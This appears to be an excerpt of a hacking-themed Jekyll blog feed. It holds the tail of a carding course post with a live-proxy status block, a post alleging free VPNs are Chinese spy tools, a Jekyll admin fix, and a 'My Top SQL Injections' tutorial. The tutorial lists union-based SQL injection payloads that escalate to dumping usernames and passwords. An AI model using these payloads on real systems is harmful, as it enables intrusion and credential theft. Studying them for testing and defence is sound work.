+━━━━━━━━━━━━
+• Proxy: 154.xxxx11 – United States 🌎
+• Status: Live! ✅
+• Retries: 1
+━━━━━━━━━━━━
+</code></pre></div></div>
+<hr />
+<blockquote>
+  <blockquote>
+    <blockquote>
+      <blockquote>
+        <h2 id="un-saludo-cordial-menciono-y-no-me-hago-responsable-del-mal-uso-de-esta-informacion-aqui-descrita">Un Saludo cordial [Menciono y no me hago responsable del mal uso de esta informacion aqui descrita]</h2>
+      </blockquote>
+    </blockquote>
+  </blockquote>
+</blockquote>
+
+<style>
+    #share-buttons {
+        display: inline-block;
+        vertical-align: middle;
+    }
+
+    #share-buttons:after {
+        content: "`In a time of deceit telling the truth is a revolutionary act`";
+        display: block;
+        clear: both;
+    }
+
+    #share-buttons>div {
+        position: relative;
+        text-align: left;
+        height: 36px;
+        width: 32px;
+        float: left;
+        text-align: center;
+    }
+
+    #share-buttons>div>svg {
+        height: 16px;
+        fill: #0eec46;
+        margin-top: 20px;
+    }
+
+    #share-buttons>div:hover {
+        cursor: pointer;
+    }
+
+    #share-buttons>div.facebook:hover>svg {
+        fill: #3B5998;
+    }
+
+    #share-buttons>div.twitter:hover>svg {
+        fill: #55ACEE;
+    }
+
+    #share-buttons>div.linkedin:hover>svg {
+        fill: #0077b5;
+    }
+
+    #share-buttons>div.pinterest:hover>svg {
+        fill: #CB2027;
+    }
+
+    #share-buttons>div.gplus:hover>svg {
+        fill: #dd4b39;
+    }
+
+    #share-buttons>div.mail:hover>svg {
+        fill: #7D7D7D;
+    }
+
+    #share-buttons>div.instagram:hover>svg {
+        fill: #C73B92;
+    }
+
+    #share-buttons>div.facebook>svg {
+        height: 29px;
+        margin-top: 9px;
+    }
+
+    #share-buttons>div.twitter>svg {
+        height: 33px;
+        margin-top: 8px;
+    }
+
+    #share-buttons>div.linkedin>svg {
+        height: 32px;
+        margin-top: 7px;
+    }
+
+    #share-buttons>div.pinterest>svg {
+        height: 29px;
+        margin-top: 9px;
+    }
+
+    /*#share-buttons>div.gplus>svg {
+        height: 28px;
+        margin-top: 9px;
+        position: relative;
+        left: 1px;
+    }*/
+
+    #share-buttons>div.mail>svg {
+        height: 29px;
+        margin-top: 11px;
+    }
+</style>
+
+<p><span style="color: rgb(114, 248, 4);">Share on: </span></p>
+<div id="share-buttons">
+    <div class="facebook" title="Share this on Facebook" onclick="window.open('http://www.facebook.com/share.php?u=http://localhost:4000/blog/curso-carding');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1343 12v264h-157q-86 0-116 36t-30 108v189h293l-39 296h-254v759h-306v-759h-255v-296h255v-218q0-186 104-288.5t277-102.5q147 0 228 12z" />
+        </svg></div>
+    <div class="twitter" title="Share this on Twitter" onclick="window.open('http://twitter.com/home?status=http://localhost:4000/blog/curso-carding');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1684 408q-67 98-162 167 1 14 1 42 0 130-38 259.5t-115.5 248.5-184.5 210.5-258 146-323 54.5q-271 0-496-145 35 4 78 4 225 0 401-138-105-2-188-64.5t-114-159.5q33 5 61 5 43 0 85-11-112-23-185.5-111.5t-73.5-205.5v-4q68 38 146 41-66-44-105-115t-39-154q0-88 44-163 121 149 294.5 238.5t371.5 99.5q-8-38-8-74 0-134 94.5-228.5t228.5-94.5q140 0 236 102 109-21 205-78-37 115-142 178 93-10 186-50z" />
+        </svg></div>
+    <div class="linkedin" title="Share this on Linkedin" onclick="window.open('https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:4000/blog/curso-carding&amp;title=&amp;summary=&amp;source=');">
+        <svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M477 625v991h-330v-991h330zm21-306q1 73-50.5 122t-135.5 49h-2q-82 0-132-49t-50-122q0-74 51.5-122.5t134.5-48.5 133 48.5 51 122.5zm1166 729v568h-329v-530q0-105-40.5-164.5t-126.5-59.5q-63 0-105.5 34.5t-63.5 85.5q-11 30-11 81v553h-329q2-399 2-647t-1-296l-1-48h329v144h-2q20-32 41-56t56.5-52 87-43.5 114.5-15.5q171 0 275 113.5t104 332.5z" />
+        </svg>
+    </div>
+    
+    <!--<div class="gplus" title="Share this on Google Plus"
+        onclick="window.open('https://plus.google.com/share?url=http://localhost:4000/blog/curso-carding');"><svg
+            viewBox="0 0 2304 1792" xmlns="http://www.w3.org/2000/svg">
+            <path
+                d="M1437 913q0 208-87 370.5t-248 254-369 91.5q-149 0-285-58t-234-156-156-234-58-285 58-285 156-234 234-156 285-58q286 0 491 192l-199 191q-117-113-292-113-123 0-227.5 62t-165.5 168.5-61 232.5 61 232.5 165.5 168.5 227.5 62q83 0 152.5-23t114.5-57.5 78.5-78.5 49-83 21.5-74h-416v-252h692q12 63 12 122zm867-122v210h-209v209h-210v-209h-209v-210h209v-209h210v209h209z" />
+        </svg></div> -->
+    <div class="mail" title="Share this through Email" onclick="window.open('mailto:?&amp;body=http://localhost:4000/blog/curso-carding');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1792 710v794q0 66-47 113t-113 47h-1472q-66 0-113-47t-47-113v-794q44 49 101 87 362 246 497 345 57 42 92.5 65.5t94.5 48 110 24.5h2q51 0 110-24.5t94.5-48 92.5-65.5q170-123 498-345 57-39 100-87zm0-294q0 79-49 151t-122 123q-376 261-468 325-10 7-42.5 30.5t-54 38-52 32.5-57.5 27-50 9h-2q-23 0-50-9t-57.5-27-52-32.5-54-38-42.5-30.5q-91-64-262-182.5t-205-142.5q-62-42-117-115.5t-55-136.5q0-78 41.5-130t118.5-52h1472q65 0 112.5 47t47.5 113z" />
+        </svg></div>
+</div>]]></content><author><name></name></author><category term="Hacking" /><category term="Cybersecurity" /><category term="Carding" /><summary type="html"><![CDATA[Carding]]></summary></entry><entry><title type="html">Los servicios VPN gratuitos son herramientas para los malvados espías chinos</title><link href="http://localhost:4000/blog/los-vpn-malvados" rel="alternate" type="text/html" title="Los servicios VPN gratuitos son herramientas para los malvados espías chinos" /><published>2022-11-16T00:00:00+01:00</published><updated>2022-11-16T00:00:00+01:00</updated><id>http://localhost:4000/blog/los-vpn-malvados</id><content type="html" xml:base="http://localhost:4000/blog/los-vpn-malvados"><![CDATA[<h5 id="️-hacker-noon-buscó-en-las-principales-aplicaciones-de-vpn-gratuitas-en-app-store-y-google-play-store-y-encontró-que-más-del-59--de-las-vpn-gratuitas-en-google-play-son-propiedad-de-china-o-tienen-su-sede-en-china">☠️ Hacker Noon buscó en las principales aplicaciones de VPN gratuitas en App Store y Google Play Store y encontró que más del 59 % de las VPN gratuitas en Google Play son propiedad de China o tienen su sede en China.</h5>
+
+<h4 id="-estos-programas-son-de-compañías-oscuras-y-muy-secretas-que-hacen-un-esfuerzo-deliberado-para-ocultar-su-información-a-los-clientes">🗣 Estos programas son de compañías oscuras y muy secretas que hacen un esfuerzo deliberado para ocultar su información a los clientes.</h4>
+
+<h5 id="-algunas-de-estas-aplicaciones-brindan-acceso-completo-al-tráfico-de-internet-de-los-usuarios-rastrean-a-los-usuarios-y-envían-datos-a-terceros-chinos-los-puntos-de-datos-recopilados-de-los-usuarios-incluyen-sitios-web-visitados-dirección-ip-incluida-la-ubicación-del-usuario-hora-y-duración-de-la-navegación-identificadores-únicos-de-dispositivos-direcciones-de-correo-electrónico-y-más-sin-embargo-los-usuarios-enrutan-todo-su-tráfico-de-internet-móvil-a-través-de-servidores-operados-por-estas-empresas-la-mayoría-de-los-cuales-no-ofrecen-protección-contra-el-uso-indebido-de-estos-datos">🗣 Algunas de estas aplicaciones brindan acceso completo al tráfico de Internet de los usuarios, rastrean a los usuarios y envían datos a terceros chinos. Los puntos de datos recopilados de los usuarios incluyen sitios web visitados, dirección IP (incluida la ubicación del usuario), hora y duración de la navegación, identificadores únicos de dispositivos, direcciones de correo electrónico y más. Sin embargo, los usuarios enrutan todo su tráfico de Internet móvil a través de servidores operados por estas empresas, la mayoría de los cuales no ofrecen protección contra el uso indebido de estos datos.</h5>
+
+<h5 id="-la-mayor-parte-de-la-empresa-registrada-innovative-connecting-es-propiedad-de-un-influyente-empresario-chino-que-es-partidario-del-partido-comunista-chen-danian-a-pesar-de-no-estar-asociado-públicamente-con-la-empresa-vpn-chen-figura-como-director-de-la-empresa-en-los-documentos-corporativos-de-singapur-según-el-informe">🗣 La mayor parte de la empresa registrada, Innovative Connecting, es propiedad de un influyente empresario chino que es partidario del Partido Comunista, Chen Danian. A pesar de no estar asociado públicamente con la empresa VPN, Chen figura como director de la empresa en los documentos corporativos de Singapur, según el informe.</h5>
+<h3 id="todas-las-aplicaciones-tienen-una-política-de-privacidad-que-establece-claramente-nuestro-negocio-puede-requerir-que-transfiramos-sus-datos-personales-a-países-fuera-del-espacio-económico-europeo-eee-incluidos-países-como-la-república-popular-de-china-o-los-estados-unidos-de-china">Todas las aplicaciones tienen una política de privacidad que establece claramente: «Nuestro negocio puede requerir que transfiramos sus datos personales a países fuera del Espacio Económico Europeo («EEE»), incluidos países como la República Popular de China o los Estados Unidos. de China</h3>
+
+<h5 id="-solo-innovative-connecting-posee-10-vpn-en-google-store-y-app-store-que-se-han-descargado-más-de-360-millones-de-veces-en-total-y-forman-parte-de-los-planes-del-régimen-chino-para-recopilar-información-de-usuarios-extranjeros-en-las-redes-sociales">🗣 Solo Innovative Connecting posee 10 VPN en Google Store y App Store, que se han descargado más de 360 ​​millones de veces en total y forman parte de los planes del régimen chino para recopilar información de usuarios extranjeros en las redes sociales.</h5>
+
+<ul>
+  <li>⛔️ VPN Master – Free Proxy</li>
+  <li>⛔️ VPN Proxy Master (Pro)</li>
+  <li>⛔️ VPN Proxy Master (Lite)</li>
+  <li>⛔️ Turbo VPN</li>
+  <li>⛔️ Unlimited Free VPN</li>
+  <li>⛔️ HOT VPN</li>
+  <li>⛔️ Snap VPN</li>
+  <li>⛔️ VPN Robot</li>
+  <li>⛔️ VPN Sofast</li>
+  <li>⛔️ Turbo VPN Private Browser</li>
+</ul>
+
+<h4 id="-curiosamente-todas-las-vpn-chinas-pueden-atravesar-el-firewall-chino-mientras-que-la-mayoría-de-las-vpn-pagas-potentes-y-confiables-no-pueden-atravesar-el-firewall-chino">🗣 Curiosamente, todas las VPN chinas pueden atravesar el firewall chino, mientras que la mayoría de las VPN pagas potentes y confiables no pueden atravesar el firewall chino.</h4>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">🔍 Revise la propiedad de las VPN gratuitas</code></li>
+  <li><code class="language-plaintext highlighter-rouge">1- top10vpn</code></li>
+</ul>
+
+<h3 id="-fuentes">🔍 Fuentes</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- fudzilla
+- asuntos de seguridad
+- forbes
+- emprendedor
+- vpnpro
+</code></pre></div></div>
+
+<hr />
+<blockquote>
+  <blockquote>
+    <blockquote>
+      <h2 id="cheers">cheers..!</h2>
+    </blockquote>
+  </blockquote>
+</blockquote>
+
+<style>
+    #share-buttons {
+        display: inline-block;
+        vertical-align: middle;
+    }
+
+    #share-buttons:after {
+        content: "`In a time of deceit telling the truth is a revolutionary act`";
+        display: block;
+        clear: both;
+    }
+
+    #share-buttons>div {
+        position: relative;
+        text-align: left;
+        height: 36px;
+        width: 32px;
+        float: left;
+        text-align: center;
+    }
+
+    #share-buttons>div>svg {
+        height: 16px;
+        fill: #0eec46;
+        margin-top: 20px;
+    }
+
+    #share-buttons>div:hover {
+        cursor: pointer;
+    }
+
+    #share-buttons>div.facebook:hover>svg {
+        fill: #3B5998;
+    }
+
+    #share-buttons>div.twitter:hover>svg {
+        fill: #55ACEE;
+    }
+
+    #share-buttons>div.linkedin:hover>svg {
+        fill: #0077b5;
+    }
+
+    #share-buttons>div.pinterest:hover>svg {
+        fill: #CB2027;
+    }
+
+    #share-buttons>div.gplus:hover>svg {
+        fill: #dd4b39;
+    }
+
+    #share-buttons>div.mail:hover>svg {
+        fill: #7D7D7D;
+    }
+
+    #share-buttons>div.instagram:hover>svg {
+        fill: #C73B92;
+    }
+
+    #share-buttons>div.facebook>svg {
+        height: 29px;
+        margin-top: 9px;
+    }
+
+    #share-buttons>div.twitter>svg {
+        height: 33px;
+        margin-top: 8px;
+    }
+
+    #share-buttons>div.linkedin>svg {
+        height: 32px;
+        margin-top: 7px;
+    }
+
+    #share-buttons>div.pinterest>svg {
+        height: 29px;
+        margin-top: 9px;
+    }
+
+    /*#share-buttons>div.gplus>svg {
+        height: 28px;
+        margin-top: 9px;
+        position: relative;
+        left: 1px;
+    }*/
+
+    #share-buttons>div.mail>svg {
+        height: 29px;
+        margin-top: 11px;
+    }
+</style>
+
+<p><span style="color: rgb(114, 248, 4);">Share on: </span></p>
+<div id="share-buttons">
+    <div class="facebook" title="Share this on Facebook" onclick="window.open('http://www.facebook.com/share.php?u=http://localhost:4000/blog/los-vpn-malvados');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1343 12v264h-157q-86 0-116 36t-30 108v189h293l-39 296h-254v759h-306v-759h-255v-296h255v-218q0-186 104-288.5t277-102.5q147 0 228 12z" />
+        </svg></div>
+    <div class="twitter" title="Share this on Twitter" onclick="window.open('http://twitter.com/home?status=http://localhost:4000/blog/los-vpn-malvados');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1684 408q-67 98-162 167 1 14 1 42 0 130-38 259.5t-115.5 248.5-184.5 210.5-258 146-323 54.5q-271 0-496-145 35 4 78 4 225 0 401-138-105-2-188-64.5t-114-159.5q33 5 61 5 43 0 85-11-112-23-185.5-111.5t-73.5-205.5v-4q68 38 146 41-66-44-105-115t-39-154q0-88 44-163 121 149 294.5 238.5t371.5 99.5q-8-38-8-74 0-134 94.5-228.5t228.5-94.5q140 0 236 102 109-21 205-78-37 115-142 178 93-10 186-50z" />
+        </svg></div>
+    <div class="linkedin" title="Share this on Linkedin" onclick="window.open('https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:4000/blog/los-vpn-malvados&amp;title=&amp;summary=&amp;source=');">
+        <svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M477 625v991h-330v-991h330zm21-306q1 73-50.5 122t-135.5 49h-2q-82 0-132-49t-50-122q0-74 51.5-122.5t134.5-48.5 133 48.5 51 122.5zm1166 729v568h-329v-530q0-105-40.5-164.5t-126.5-59.5q-63 0-105.5 34.5t-63.5 85.5q-11 30-11 81v553h-329q2-399 2-647t-1-296l-1-48h329v144h-2q20-32 41-56t56.5-52 87-43.5 114.5-15.5q171 0 275 113.5t104 332.5z" />
+        </svg>
+    </div>
+    
+    <!--<div class="gplus" title="Share this on Google Plus"
+        onclick="window.open('https://plus.google.com/share?url=http://localhost:4000/blog/los-vpn-malvados');"><svg
+            viewBox="0 0 2304 1792" xmlns="http://www.w3.org/2000/svg">
+            <path
+                d="M1437 913q0 208-87 370.5t-248 254-369 91.5q-149 0-285-58t-234-156-156-234-58-285 58-285 156-234 234-156 285-58q286 0 491 192l-199 191q-117-113-292-113-123 0-227.5 62t-165.5 168.5-61 232.5 61 232.5 165.5 168.5 227.5 62q83 0 152.5-23t114.5-57.5 78.5-78.5 49-83 21.5-74h-416v-252h692q12 63 12 122zm867-122v210h-209v209h-210v-209h-209v-210h209v-209h210v209h209z" />
+        </svg></div> -->
+    <div class="mail" title="Share this through Email" onclick="window.open('mailto:?&amp;body=http://localhost:4000/blog/los-vpn-malvados');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1792 710v794q0 66-47 113t-113 47h-1472q-66 0-113-47t-47-113v-794q44 49 101 87 362 246 497 345 57 42 92.5 65.5t94.5 48 110 24.5h2q51 0 110-24.5t94.5-48 92.5-65.5q170-123 498-345 57-39 100-87zm0-294q0 79-49 151t-122 123q-376 261-468 325-10 7-42.5 30.5t-54 38-52 32.5-57.5 27-50 9h-2q-23 0-50-9t-57.5-27-52-32.5-54-38-42.5-30.5q-91-64-262-182.5t-205-142.5q-62-42-117-115.5t-55-136.5q0-78 41.5-130t118.5-52h1472q65 0 112.5 47t47.5 113z" />
+        </svg></div>
+</div>]]></content><author><name></name></author><category term="Hacking" /><category term="Cybersecurity" /><category term="Vpn" /><summary type="html"><![CDATA[VPN gratuitos]]></summary></entry><entry><title type="html">Admin [Blank Page Jekyll] [Solution]</title><link href="http://localhost:4000/blog/admin-blank-page" rel="alternate" type="text/html" title="Admin [Blank Page Jekyll] [Solution]" /><published>2022-11-11T00:00:00+01:00</published><updated>2022-11-11T00:00:00+01:00</updated><id>http://localhost:4000/blog/admin-blank-page</id><content type="html" xml:base="http://localhost:4000/blog/admin-blank-page"><![CDATA[<h2 id="after-some-days-of-large-research-i-have-found-a-solution-of-the-blank-page-of-the-localhost4000admin-of-jekylls-themes">After some days of large Research I have found a solution of the —blank page— of the localhost:4000/admin of jekylls themes.</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+ U must remove the version of your jekyll-admin from Gem.file <span class="k">in </span>your path admin.
+
+and leave only jekyll-admin , simply , no version needed like <span class="s2">"0.9.0"</span> this will make /admin crashing with all gems and ruby versions
+
+</code></pre></div></div>
+
+<p>Take a <code class="language-plaintext highlighter-rouge">look</code> at <code class="language-plaintext highlighter-rouge">my gemfile</code> you should have equal to this.</p>
+
+<p><img src="/assets/images/imagesposts/admin.png" alt="admin" /></p>
+
+<p>var s = “JavaScript syntax highlighting”;
+alert(cheers);</p>
+
+<style>
+    #share-buttons {
+        display: inline-block;
+        vertical-align: middle;
+    }
+
+    #share-buttons:after {
+        content: "`In a time of deceit telling the truth is a revolutionary act`";
+        display: block;
+        clear: both;
+    }
+
+    #share-buttons>div {
+        position: relative;
+        text-align: left;
+        height: 36px;
+        width: 32px;
+        float: left;
+        text-align: center;
+    }
+
+    #share-buttons>div>svg {
+        height: 16px;
+        fill: #0eec46;
+        margin-top: 20px;
+    }
+
+    #share-buttons>div:hover {
+        cursor: pointer;
+    }
+
+    #share-buttons>div.facebook:hover>svg {
+        fill: #3B5998;
+    }
+
+    #share-buttons>div.twitter:hover>svg {
+        fill: #55ACEE;
+    }
+
+    #share-buttons>div.linkedin:hover>svg {
+        fill: #0077b5;
+    }
+
+    #share-buttons>div.pinterest:hover>svg {
+        fill: #CB2027;
+    }
+
+    #share-buttons>div.gplus:hover>svg {
+        fill: #dd4b39;
+    }
+
+    #share-buttons>div.mail:hover>svg {
+        fill: #7D7D7D;
+    }
+
+    #share-buttons>div.instagram:hover>svg {
+        fill: #C73B92;
+    }
+
+    #share-buttons>div.facebook>svg {
+        height: 29px;
+        margin-top: 9px;
+    }
+
+    #share-buttons>div.twitter>svg {
+        height: 33px;
+        margin-top: 8px;
+    }
+
+    #share-buttons>div.linkedin>svg {
+        height: 32px;
+        margin-top: 7px;
+    }
+
+    #share-buttons>div.pinterest>svg {
+        height: 29px;
+        margin-top: 9px;
+    }
+
+    /*#share-buttons>div.gplus>svg {
+        height: 28px;
+        margin-top: 9px;
+        position: relative;
+        left: 1px;
+    }*/
+
+    #share-buttons>div.mail>svg {
+        height: 29px;
+        margin-top: 11px;
+    }
+</style>
+
+<p><span style="color: rgb(114, 248, 4);">Share on: </span></p>
+<div id="share-buttons">
+    <div class="facebook" title="Share this on Facebook" onclick="window.open('http://www.facebook.com/share.php?u=http://localhost:4000/blog/admin-blank-page');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1343 12v264h-157q-86 0-116 36t-30 108v189h293l-39 296h-254v759h-306v-759h-255v-296h255v-218q0-186 104-288.5t277-102.5q147 0 228 12z" />
+        </svg></div>
+    <div class="twitter" title="Share this on Twitter" onclick="window.open('http://twitter.com/home?status=http://localhost:4000/blog/admin-blank-page');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1684 408q-67 98-162 167 1 14 1 42 0 130-38 259.5t-115.5 248.5-184.5 210.5-258 146-323 54.5q-271 0-496-145 35 4 78 4 225 0 401-138-105-2-188-64.5t-114-159.5q33 5 61 5 43 0 85-11-112-23-185.5-111.5t-73.5-205.5v-4q68 38 146 41-66-44-105-115t-39-154q0-88 44-163 121 149 294.5 238.5t371.5 99.5q-8-38-8-74 0-134 94.5-228.5t228.5-94.5q140 0 236 102 109-21 205-78-37 115-142 178 93-10 186-50z" />
+        </svg></div>
+    <div class="linkedin" title="Share this on Linkedin" onclick="window.open('https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:4000/blog/admin-blank-page&amp;title=&amp;summary=&amp;source=');">
+        <svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M477 625v991h-330v-991h330zm21-306q1 73-50.5 122t-135.5 49h-2q-82 0-132-49t-50-122q0-74 51.5-122.5t134.5-48.5 133 48.5 51 122.5zm1166 729v568h-329v-530q0-105-40.5-164.5t-126.5-59.5q-63 0-105.5 34.5t-63.5 85.5q-11 30-11 81v553h-329q2-399 2-647t-1-296l-1-48h329v144h-2q20-32 41-56t56.5-52 87-43.5 114.5-15.5q171 0 275 113.5t104 332.5z" />
+        </svg>
+    </div>
+    
+    <!--<div class="gplus" title="Share this on Google Plus"
+        onclick="window.open('https://plus.google.com/share?url=http://localhost:4000/blog/admin-blank-page');"><svg
+            viewBox="0 0 2304 1792" xmlns="http://www.w3.org/2000/svg">
+            <path
+                d="M1437 913q0 208-87 370.5t-248 254-369 91.5q-149 0-285-58t-234-156-156-234-58-285 58-285 156-234 234-156 285-58q286 0 491 192l-199 191q-117-113-292-113-123 0-227.5 62t-165.5 168.5-61 232.5 61 232.5 165.5 168.5 227.5 62q83 0 152.5-23t114.5-57.5 78.5-78.5 49-83 21.5-74h-416v-252h692q12 63 12 122zm867-122v210h-209v209h-210v-209h-209v-210h209v-209h210v209h209z" />
+        </svg></div> -->
+    <div class="mail" title="Share this through Email" onclick="window.open('mailto:?&amp;body=http://localhost:4000/blog/admin-blank-page');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1792 710v794q0 66-47 113t-113 47h-1472q-66 0-113-47t-47-113v-794q44 49 101 87 362 246 497 345 57 42 92.5 65.5t94.5 48 110 24.5h2q51 0 110-24.5t94.5-48 92.5-65.5q170-123 498-345 57-39 100-87zm0-294q0 79-49 151t-122 123q-376 261-468 325-10 7-42.5 30.5t-54 38-52 32.5-57.5 27-50 9h-2q-23 0-50-9t-57.5-27-52-32.5-54-38-42.5-30.5q-91-64-262-182.5t-205-142.5q-62-42-117-115.5t-55-136.5q0-78 41.5-130t118.5-52h1472q65 0 112.5 47t47.5 113z" />
+        </svg></div>
+</div>]]></content><author><name></name></author><category term="Jekyll" /><category term="Admin" /><category term="Linux" /><summary type="html"><![CDATA[Solution to the error of the jekyyl /admin blank page, and here is my solution.]]></summary></entry><entry><title type="html">My Top SQL Injections</title><link href="http://localhost:4000/blog/sql-injections" rel="alternate" type="text/html" title="My Top SQL Injections" /><published>2022-11-11T00:00:00+01:00</published><updated>2022-11-11T00:00:00+01:00</updated><id>http://localhost:4000/blog/sql-injections</id><content type="html" xml:base="http://localhost:4000/blog/sql-injections"><![CDATA[<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                             My Top SQL Injections (mostly parched) (basic-low-medium level) 
+</code></pre></div></div>
+
+<h2 id="1-check-in">[1] Check-in</h2>
+
+<p>Input:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1
+</code></pre></div></div>
+
+<blockquote>
+  <blockquote>
+    <p>La página web/código debe imprimir ID, nombre y apellido en la pantalla.</p>
+  </blockquote>
+</blockquote>
+
+<blockquote>
+  <blockquote>
+    <blockquote>
+      <p>Declaración de selección de PHP, específicamente $id, se ve asi:</p>
+    </blockquote>
+  </blockquote>
+</blockquote>
+
+<p>$getid = “SELECT first_name, last_name FROM users WHERE user_id = ‘$id’”;</p>
+
+<h2 id="2-basic-one">[2] Basic-one</h2>
+
+<p>Input:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%<span class="s1">' or '</span>0<span class="s1">'='</span>0
+</code></pre></div></div>
+
+<blockquote>
+  <p>En este escenario, decimos mostrar todos los registros que son falsos y todos los registros que son verdaderos.
+%’ - Probablemente no será igual a nada y será falso.
+‘0’=’0’ - Es igual a verdadero, porque 0 siempre será igual a 0.</p>
+</blockquote>
+
+<blockquote>
+  <blockquote>
+    <blockquote>
+      <p>Declaración de base de datos, se ve asi:</p>
+
+      <blockquote>
+        <p>mysql&gt; SELECT first_name, last_name FROM users WHERE user_id = ‘%’ o ‘0’=’0’;</p>
+      </blockquote>
+    </blockquote>
+  </blockquote>
+</blockquote>
+
+<h2 id="3-database-version">[3] Database-Version</h2>
+
+<p>Input:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%<span class="s1">' or 0=0 union select null, version() #
+</span></code></pre></div></div>
+
+<blockquote>
+  <blockquote>
+    <blockquote>
+      <p>Esta es la versión de la base de datos mysql.</p>
+    </blockquote>
+  </blockquote>
+</blockquote>
+
+<h2 id="4-database-user">[4] Database-User</h2>
+
+<p>Input:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%<span class="s1">' or 0=0 union select null, user() #
+</span></code></pre></div></div>
+
+<blockquote>
+  <blockquote>
+    <p>Este es el nombre del usuario de la base de datos que ejecutó el código PHP detrás de escena.</p>
+  </blockquote>
+</blockquote>
+
+<h2 id="5-database-name">[5] Database-Name</h2>
+
+<p>Input:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%<span class="s1">' or 0=0 union select null, database() #
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>This is the name of the database, nombre de la base de datos.</p>
+</blockquote>
+
+<h2 id="6-displayall-tablesininformation_schema">[6] Display–all-tables–in–information_schema</h2>
+
+<p>Input:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%<span class="s1">' and 1=0 union select null, table_name from information_schema.tables #
+</span></code></pre></div></div>
+
+<blockquote>
+  <blockquote>
+    <p>Mostrando todas las tablas en la base de datos information_schema.
+El INFORMACION_ESQUEMA es la base de datos de información, el lugar que almacena información sobre todas las demás bases de datos que mantiene el servidor MySQL.</p>
+  </blockquote>
+</blockquote>
+
+<h2 id="7-display-all-the-user-tables-in-information_schema">[7] Display-all-the user tables in information_schema</h2>
+
+<p>Input:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%<span class="s1">' and 1=0 union select null, table_name from information_schema.tables where table_name like '</span>user%<span class="s1">'#
+</span></code></pre></div></div>
+
+<blockquote>
+  <blockquote>
+    <p>Estamos mostrando todas las tablas que comienzan con el prefijo “usuario” en la base de datos information_schema.</p>
+  </blockquote>
+</blockquote>
+
+<h2 id="8-display-all-the-columns-fields-in-the-information_schema-user-table">[8] Display all the columns fields in the information_schema user table</h2>
+
+<p>Input:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%<span class="s1">' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = '</span><span class="nb">users</span><span class="s1">' #
+</span></code></pre></div></div>
+
+<blockquote>
+  <blockquote>
+    <p>Ahora estamos mostrando todas las columnas en la tabla de usuarios.</p>
+
+    <blockquote>
+      <p>Observe que hay una columna de ID de usuario, nombre, apellido, usuario y contraseña.</p>
+    </blockquote>
+  </blockquote>
+</blockquote>
+
+<h2 id="9-display-all-the-columns-field-contents-in-the-information_schema-user-table">[9] Display all the columns field contents in the information_schema user table</h2>
+
+<p>Input:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%<span class="s1">' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
+</span></code></pre></div></div>
+
+<blockquote>
+  <blockquote>
+    <p>Ahora hemos mostrado con éxito toda la información de autenticación necesaria en esta base de datos.</p>
+  </blockquote>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">ɹǝqʎɔɯʇ</code></pre></figure>
+
+<style>
+    #share-buttons {
+        display: inline-block;
+        vertical-align: middle;
+    }
+
+    #share-buttons:after {
+        content: "`In a time of deceit telling the truth is a revolutionary act`";
+        display: block;
+        clear: both;
+    }
+
+    #share-buttons>div {
+        position: relative;
+        text-align: left;
+        height: 36px;
+        width: 32px;
+        float: left;
+        text-align: center;
+    }
+
+    #share-buttons>div>svg {
+        height: 16px;
+        fill: #0eec46;
+        margin-top: 20px;
+    }
+
+    #share-buttons>div:hover {
+        cursor: pointer;
+    }
+
+    #share-buttons>div.facebook:hover>svg {
+        fill: #3B5998;
+    }
+
+    #share-buttons>div.twitter:hover>svg {
+        fill: #55ACEE;
+    }
+
+    #share-buttons>div.linkedin:hover>svg {
+        fill: #0077b5;
+    }
+
+    #share-buttons>div.pinterest:hover>svg {
+        fill: #CB2027;
+    }
+
+    #share-buttons>div.gplus:hover>svg {
+        fill: #dd4b39;
+    }
+
+    #share-buttons>div.mail:hover>svg {
+        fill: #7D7D7D;
+    }
+
+    #share-buttons>div.instagram:hover>svg {
+        fill: #C73B92;
+    }
+
+    #share-buttons>div.facebook>svg {
+        height: 29px;
+        margin-top: 9px;
+    }
+
+    #share-buttons>div.twitter>svg {
+        height: 33px;
+        margin-top: 8px;
+    }
+
+    #share-buttons>div.linkedin>svg {
+        height: 32px;
+        margin-top: 7px;
+    }
+
+    #share-buttons>div.pinterest>svg {
+        height: 29px;
+        margin-top: 9px;
+    }
+
